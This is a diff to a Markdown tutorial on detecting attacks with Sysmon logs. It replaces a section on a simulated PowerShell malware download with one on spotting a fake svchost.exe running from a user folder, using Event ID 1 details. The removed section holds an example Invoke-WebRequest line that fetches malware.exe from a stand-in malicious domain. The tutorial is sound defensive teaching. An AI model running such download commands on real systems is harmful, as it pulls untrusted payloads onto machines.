@@ -62,49 +62,48 @@ After installation, verify that Sysmon is running by checking the Event Viewer f
 ```
 You should see events for process creation, network connections, and other monitored activities.
 
-## Step 3: Detecting Malicious Activity Using Sysmon Logs 🚨
+## Step 3: Detecting a Suspicious Process Masquerading as svchost.exe 🕵️‍♂️
 
-In this section, we will simulate and analyze a malicious PowerShell execution that downloads a suspicious file from an untrusted IP address.
-Scenario: Detecting PowerShell-based Malware Execution
+In this step, we simulate a scenario where an attacker attempts to run a malicious process that disguises itself as a legitimate Windows service — svchost.exe. This is a common technique used in malware to avoid detection by security tools.
+Scenario: Process Masquerading with Python
 
-Let’s simulate a scenario where an attacker uses PowerShell to download a malicious file from a remote IP address. You can imagine this is a real-world situation where an attacker is trying to compromise a system using PowerShell Empire or Cobalt Strike.
-Simulating Malicious PowerShell Execution:
+The attacker executes a Python script that launches a process with the name svchost.exe. Although the process name appears legitimate, its location and behavior are not consistent with the real Windows svchost.exe.
+Simulation:
 
-1. Create a PowerShell script (simulation):
-   The attacker may execute a PowerShell command like:
-   ```powershell
-   Invoke-WebRequest -Uri http://maliciousdomain.com/malware.exe -OutFile C:\Users\Victim\Downloads\malware.exe
-   ```
-   This PowerShell script downloads a malicious file (malware.exe) from a suspicious IP and saves it to a Downloads folder.
+We use a custom Python script to simulate this behavior:
+```powershell
+python svchost.py
+```
+Make sure the script runs a child process with the image name svchost.exe from a non-standard directory (e.g., user's Downloads or Desktop).
 
-2. Trigger the Attack Simulation:
+Sysmon Detection:
 
-    To simulate the attack, you can execute the script or any PowerShell command that attempts to download a file from an untrusted source. You can either run this script manually or automate it for testing purposes.
+Once the fake svchost.exe is executed, Sysmon will log the process creation and image load events.
 
-3. Analyze Sysmon Logs:
+1️⃣ View Process Creation (Event ID 1):
 
-Once the attack is triggered, Sysmon will log events related to the PowerShell execution and the network connection to the malicious IP.
+Open Event Viewer:
+```nginx
+Applications and Services Logs > Microsoft > Windows > Sysmon > Operational
+```
+Filter for Event ID 1, and look for suspicious details such as:
 
-  Step 1: Open Event Viewer and navigate to:
-  ```powershell
-  Applications and Services Logs > Microsoft > Windows > Sysmon > Operational
-  ```
-  Step 2: Search for events related to PowerShell execution:
-  
-  Use the XPath query to search for PowerShell executions:
-  ```powershell
-      *[EventData[Data[@Name='Image'] and (Data='powershell.exe')]]
-  ```
-  Step 3: Look for Network Connection Events that may indicate a connection to a suspicious IP:
-  
-  Use the XPath query to search for network connections to untrusted IPs:
-  ```powershell
-      *[EventData[Data[@Name='DestinationIp'] and (Data='192.168.1.100')]]
-  ```
-  Step 4: Once suspicious PowerShell execution and network connection events are found, review the event details:
-  
-  . PowerShell process information (e.g., parameters, parent processes)
-  
-  . The destination IP (could be a known malicious IP)
-  
-  . File creation events (e.g., file being saved to Downloads)
+. Image Path: The real svchost.exe should be in C:\Windows\System32. If it runs from Downloads, it's likely malicious.
+
+. Parent Process: A legitimate svchost.exe is usually started by services.exe. If you see python.exe or another unusual parent, it's suspicious.
+
+2️⃣ Look for Additional Events:
+
+. Event ID 7 - Image loaded (DLLs)
+
+. Event ID 11 - File created (if the script creates files)
+
+. Event ID 3 - Network connection (if the process connects to internet)
+
+Example Event Highlights:
+```plaintext
+Image: C:\Users\User\Downloads\svchost.exe
+ParentImage: C:\Python311\python.exe
+CommandLine: "C:\Users\User\Downloads\svchost.exe"
+```
+This behavior should raise red flags, as it imitates a critical Windows process but originates from a user directory.
